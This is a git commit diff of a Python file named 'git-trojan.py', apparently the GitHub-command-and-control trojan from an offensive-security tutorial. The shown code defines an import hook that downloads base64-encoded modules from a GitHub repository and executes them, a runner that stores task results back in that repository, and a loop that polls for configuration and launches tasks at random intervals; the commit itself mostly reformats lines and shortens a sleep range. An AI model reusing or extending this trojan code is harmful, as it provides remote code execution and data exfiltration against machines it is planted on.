38599e04656c188af2f57cb3f02c5a04397cf6d7
root <root@localhost.localdomain>
2020-02-28 01:44:51 +0100

    Adding new modules

--- git-trojan.py
+++ git-trojan.py
@@ -7,7 +7,6 @@ import random
 import threading
 import Queue
 import os
-
 from github3 import login 
 trojan_id = "trojan"
 trojan_config = "%s.json" % trojan_id
@@ -55,7 +54,7 @@ class GitImporter(object):
 		self.current_module_code = ""
 	def find_module(self,fullname,path=None):
 		if configured:
-			print " ** Attempting to retrieve %s" % fullname
+			print"[*] Attempting to retrieve %s" % fullname
 			new_library = get_file_contents("modules/%s" % fullname)
 			if new_library is not None:
 				self.current_module_code = base64.b64decode(new_library)
@@ -65,21 +64,21 @@ class GitImporter(object):
 		module = imp.new_module(name)
 		exec self.current_module_code in module.__dict__
 		sys.modules[name] = module
-		return module                
-	def module_runner(module):
-		task_queue.put(1)
-		result = sys.modules[module].run()
-		task_queue.get()
-	
-		store_module_result(result)
-		return
-	
+		return module
+def module_runner(module):
+	task_queue.put(1)
+	result = sys.modules[module].run()
+	task_queue.get()
+	# store result in our repo
+	store_module_result(result)
+	return
+# main trojan loop
 sys.meta_path = [GitImporter()]
 while True:
 	if task_queue.empty():
 		config = get_trojan_config()
 		for task in config:
-			t = threading.Thread(target = module_runner,args=(task['module'],))
+			t = threading.Thread(target=module_runner,args=(task['module'],))
 			t.start()
 			time.sleep(random.randint(1,10))
-	time.sleep(random.randint(1000, 100000))
+	time.sleep(random.randint(1000,10000))
